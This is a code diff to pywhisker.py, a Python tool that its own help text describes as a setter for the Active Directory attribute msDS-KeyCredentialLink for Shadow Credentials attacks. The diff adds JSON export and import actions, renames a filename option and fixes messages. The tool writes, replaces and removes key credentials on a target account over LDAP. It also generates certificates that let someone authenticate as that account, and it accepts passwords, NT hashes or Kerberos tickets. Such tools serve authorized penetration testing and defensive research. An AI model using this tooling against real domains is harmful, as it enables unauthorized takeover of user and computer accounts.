@@ -3,7 +3,7 @@
 # File name          : pywhisker.py
 # Author             : Charlie Bromberg (@_nwodtuhs) & Podalirius (@podalirius_)
 # Date created       : 29 Jul 2021
-
+import json
 import random
 import string
 import traceback
@@ -276,7 +276,6 @@ class ShadowCredentials(object):
             logger.error('Could not query target user properties')
             return
         try:
-            new_values = []
             device_id_in_current_values = False
             for dn_binary_value in results['raw_attributes']['msDS-KeyCredentialLink']:
                 keyCredential = KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(dn_binary_value))
@@ -284,9 +283,7 @@ class ShadowCredentials(object):
                     logger.success("Found device Id")
                     keyCredential.show()
                     device_id_in_current_values = True
-                else:
-                    new_values.append(dn_binary_value)
-            if device_id_in_current_values != True:
+            if not device_id_in_current_values:
                 logger.warning("No value with the provided DeviceID was found for the target object")
         except IndexError:
             logger.info('Attribute msDS-KeyCredentialLink does not exist')
@@ -313,7 +310,7 @@ class ShadowCredentials(object):
             return
         try:
             if len(results['raw_attributes']['msDS-KeyCredentialLink']) == 0:
-                logger.info('Attribute msDS-KeyCredentialLink is empty')
+                logger.info('Attribute msDS-KeyCredentialLink is either empty or user does not have read permissions on that attribute')
             else:
                 logger.info("Listing devices for %s" % self.target_samname)
                 for dn_binary_value in results['raw_attributes']['msDS-KeyCredentialLink']:
@@ -356,7 +353,7 @@ class ShadowCredentials(object):
                 logger.success("Updated the msDS-KeyCredentialLink attribute of the target object")
                 if path is None:
                     path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
-                    logger.verbose("No outfile path was provided. The certificate(s) will be store with the filename: %s" % path)
+                    logger.verbose("No filename was provided. The certificate(s) will be stored with the filename: %s" % path)
                 if export_type == "PEM":
                     certificate.ExportPEM(path_to_files=path)
                     logger.success("Saved PEM certificate at path: %s" % path + "_cert.pem")
@@ -367,7 +364,7 @@ class ShadowCredentials(object):
                 elif export_type == "PFX":
                     if password is None:
                         password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
-                        logger.verbose("No pass was provided. The certificate will be store with the password: %s" % password)
+                        logger.verbose("No pass was provided. The certificate will be stored with the password: %s" % password)
                     certificate.ExportPFX(password=password, path_to_file=path)
                     logger.success("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
                     logger.info("Must be used with password: %s" % password)
@@ -414,7 +411,7 @@ class ShadowCredentials(object):
                     device_id_in_current_values = True
                 else:
                     new_values.append(dn_binary_value)
-            if device_id_in_current_values == True:
+            if device_id_in_current_values:
                 logger.info("Updating the msDS-KeyCredentialLink attribute of %s" % self.target_samname)
                 self.ldap_session.modify(self.target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
                 if self.ldap_session.result['result'] == 0:
@@ -467,6 +464,85 @@ class ShadowCredentials(object):
                     else:
                         logger.error('The server returned an error: %s' % self.ldap_session.result['message'])
                 return
+        except IndexError:
+            logger.info('Attribute msDS-KeyCredentialLink does not exist')
+        return
+
+
+    def importFromJSON(self, filename):
+        logger.info("Searching for the target account")
+        result = self.get_dn_sid_from_samname(self.target_samname)
+        if not result:
+            logger.error('Target account does not exist! (wrong domain?)')
+            return
+        else:
+            self.target_dn = result[0]
+            logger.info("Target user found: %s" % self.target_dn)
+        self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
+        results = None
+        for entry in self.ldap_session.response:
+            if entry['type'] != 'searchResEntry':
+                continue
+            results = entry
+        if not results:
+            logger.error('Could not query target user properties')
+            return
+        try:
+            if os.path.exists(filename):
+                keyCredentials = []
+                with open(filename, "r") as f:
+                    data = json.load(f)
+                    for kcjson in data["keyCredentials"]:
+                        keyCredentials.append(KeyCredential.fromDict(kcjson).toDNWithBinary().toString())
+            logger.info("Modifying the msDS-KeyCredentialLink attribute of %s" % self.target_samname)
+            self.ldap_session.modify(self.target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, keyCredentials]})
+            if self.ldap_session.result['result'] == 0:
+                logger.success('msDS-KeyCredentialLink modified successfully!')
+            else:
+                if self.ldap_session.result['result'] == 50:
+                    logger.error('Could not modify object, the server reports insufficient rights: %s' % self.ldap_session.result['message'])
+                elif self.ldap_session.result['result'] == 19:
+                    logger.error('Could not modify object, the server reports a constrained violation: %s' % self.ldap_session.result['message'])
+                else:
+                    logger.error('The server returned an error: %s' % self.ldap_session.result['message'])
+            return
+        except IndexError:
+            logger.info('Attribute msDS-KeyCredentialLink does not exist')
+        return
+
+
+    def exportToJSON(self, filename):
+        logger.info("Searching for the target account")
+        result = self.get_dn_sid_from_samname(self.target_samname)
+        if not result:
+            logger.error('Target account does not exist! (wrong domain?)')
+            return
+        else:
+            self.target_dn = result[0]
+            logger.info("Target user found: %s" % self.target_dn)
+        self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
+        results = None
+        for entry in self.ldap_session.response:
+            if entry['type'] != 'searchResEntry':
+                continue
+            results = entry
+        if not results:
+            logger.error('Could not query target user properties')
+            return
+        try:
+            if filename is None:
+                filename = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8)) + ".json"
+                logger.verbose("No filename was provided. The keyCredential(s) will be stored with the filename: %s" % filename)
+            if len(os.path.dirname(filename)) != 0:
+                if not os.path.exists(os.path.dirname(filename)):
+                    os.makedirs(os.path.dirname(filename), exist_ok=True)
+            keyCredentialsJSON = {"keyCredentials":[]}
+            for dn_binary_value in results['raw_attributes']['msDS-KeyCredentialLink']:
+                keyCredential = KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(dn_binary_value))
+                keyCredentialsJSON["keyCredentials"].append(keyCredential.toDict())
+            with open(filename, "w") as f:
+                f.write(json.dumps(keyCredentialsJSON, indent=4))
+            logger.success("Saved JSON dump at path: %s" % filename)
         except IndexError:
             logger.info('Attribute msDS-KeyCredentialLink does not exist')
         return
@@ -600,7 +676,7 @@ class Logger(object):
 def parse_args():
     parser = argparse.ArgumentParser(add_help=True, description='Python (re)setter for property msDS-KeyCredentialLink for Shadow Credentials attacks.')
     parser.add_argument("-t", "--target", type=str, required=True, dest="target_samname", help="Target account")
-    parser.add_argument("-a", "--action", choices=['list', 'add', 'remove', 'clear', 'info'], nargs='?', default='list', help='Action to operate on msDS-KeyCredentialLink')
+    parser.add_argument("-a", "--action", choices=['list', 'add', 'remove', 'clear', 'info', 'export', 'import'], nargs='?', default='list', help='Action to operate on msDS-KeyCredentialLink')
     parser.add_argument('--use-ldaps', action='store_true', help='Use LDAPS instead of LDAP')
     parser.add_argument("-v", "--verbose", dest="verbosity", action="count", default=0, help="verbosity level (-v for verbose, -vv for debug)")
     parser.add_argument("-q", "--quiet", dest="quiet", action="store_true", default=False, help="show no information at all")
@@ -616,11 +692,11 @@ def parse_args():
     cred.add_argument("-p", "--password", dest="auth_password", metavar="PASSWORD", action="store", help="password to authenticate with")
     cred.add_argument("-H", "--hashes", dest="auth_hashes", action="store", metavar="[LMHASH:]NTHASH", help='NT/LM hashes, format is LMhash:NThash')
     cred.add_argument('--aes-key', dest="auth_key", action="store", metavar="hex key", help='AES key to use for Kerberos Authentication (128 or 256 bits)')
-    secret.add_argument("-k", "--kerberos", dest="use_kerberos", action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line')
+    secret.add_argument("-k", "--kerberos", dest="use_kerberos", action="store_true", help='Use Kerberos authentication. Grabs credentials from .ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line')
 
     add = parser.add_argument_group('arguments when setting -action to add')
     add.add_argument("-P", "--pfx-password", action='store', help='password for the PFX stored self-signed certificate (will be random if not set, not needed when exporting to PEM)')
-    add.add_argument("-o", "--outfile-path", action='store', help='filename to store the generated self-signed PEM or PFX certificate and key')
+    add.add_argument("-f", "--filename", action='store', help='filename to store the generated self-signed PEM or PFX certificate and key, or filename for the "import"/"export" actions')
     add.add_argument("-e", "--export", action='store', choices=["PEM"," PFX"], type = lambda s : s.upper(), default="PFX", help='choose to export cert+private key in PEM or PFX (i.e. #PKCS12) (default: PFX))')
 
     remove = parser.add_argument_group('arguments when setting -action to remove')
@@ -633,7 +709,10 @@ def parse_args():
     args = parser.parse_args()
 
     if (args.action == "remove" or args.action == "info") and args.device_id is None:
-        parser.error("the following arguments are required when setting -action == remove or info")
+        parser.error("the following arguments are required when setting -action == remove or info: -D/--device-id")
+
+    if args.action == "import" and args.filename is None:
+        parser.error("the following arguments are required when setting -action == import or info: -f/--filename")
 
     return args
 
@@ -658,13 +737,17 @@ def main():
         if args.action == 'list':
             shadowcreds.list()
         elif args.action == 'add':
-            shadowcreds.add(password=args.pfx_password, path=args.outfile_path, export_type=args.export, domain=args.auth_domain)
+            shadowcreds.add(password=args.pfx_password, path=args.filename, export_type=args.export, domain=args.auth_domain)
         elif args.action == 'remove':
             shadowcreds.remove(args.device_id)
         elif args.action == 'info':
             shadowcreds.info(args.device_id)
         elif args.action == 'clear':
             shadowcreds.clear()
+        elif args.action == 'export':
+            shadowcreds.exportToJSON(filename=args.filename)
+        elif args.action == 'import':
+            shadowcreds.importFromJSON(filename=args.filename)
     except Exception as e:
         if args.verbosity >= 1:
             traceback.print_exc()
